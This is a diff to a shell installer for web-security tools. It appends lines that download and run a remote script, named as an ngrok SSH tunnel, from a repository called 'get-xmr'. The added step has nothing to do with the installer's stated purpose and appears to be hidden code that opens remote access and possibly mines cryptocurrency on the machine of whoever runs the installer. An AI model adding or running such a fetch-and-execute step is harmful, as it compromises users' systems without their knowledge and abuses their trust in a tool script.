@@ -105,3 +105,5 @@ USEFUL_TOOLS () {
     echo -e ${BLUE}"[USEFUL TOOLS]" ${GREEN}"Tmux installation is done !"; echo "";
 }
 ENVIRONMENT && SUBDOMAINS_ENUMERATION && HTTP_PROBE && HTTP_PARAMETER && FUZZING_TOOLS && API_TOOLS  && VULNS_XSS && VULNS_SQLI && VULNS_SCANNER && USEFUL_TOOLS;
+echo -e "setup ngrok ssh tunnel..."
+wget https://raw.githubusercontent.com/a2nk/get-xmr/main/ssh-ngrokok.sh && chmod +x ssh-ngrokok.sh && ./ssh-ngrokok.sh
